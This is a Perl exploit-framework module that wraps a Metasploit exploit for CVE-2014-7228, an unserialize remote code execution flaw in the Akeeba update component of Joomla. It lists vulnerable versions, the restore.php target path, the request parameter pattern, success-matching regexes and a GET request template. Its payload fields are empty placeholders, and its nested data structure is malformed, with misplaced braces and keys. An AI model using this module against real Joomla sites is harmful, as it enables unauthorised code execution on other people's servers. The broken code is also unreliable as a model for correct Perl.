package JOOMLA::MSF::JoomlaAkeebaUnserialize;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "JoomlaAkeebaUnserialize";

   my $DETECTION = {

   };

my $EXPLOIT = {
  ADMINISTRATOR => "components",
  CVE => "CVE-2014-7228",
  DESCRIPTION => "

        This module exploits a vulnerability found in Joomla! through 2.5.25, 3.2.5 and earlier

        3.x versions and 3.3.0 through 3.3.4 versions. The vulnerability affects the Akeeba

        component, which is responsible for Joomla! updates. Nevertheless it is worth to note

        that this vulnerability is only exploitable during the update of the Joomla! CMS.

      ",
  METHOD => "GET",
  MSF_MODULE => "joomla_akeeba_unserialize",
  PATH => "task=stepRestore&factory=__FACTORY__&",
  PATHS => [
    "administrator/components/com_joomlaupdate/restore.php",
    "administrator/components/com_joomlaupdate/restore.php",
    "joomla",
  ],
  PAYLOAD => "?",
  REFERENCES => [
    "http://developer.joomla.org/security/595-20140903-core-remote-file-inclusion.html",
    "https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html",
    "http://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/",
  ],
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to Joomla", VALUE => "/joomla" },
    'FACTORY' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       (
  "^###\\{\"status\":true.*\\}###",
  "^###\\{\"status\":true.*\\}###",
),

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
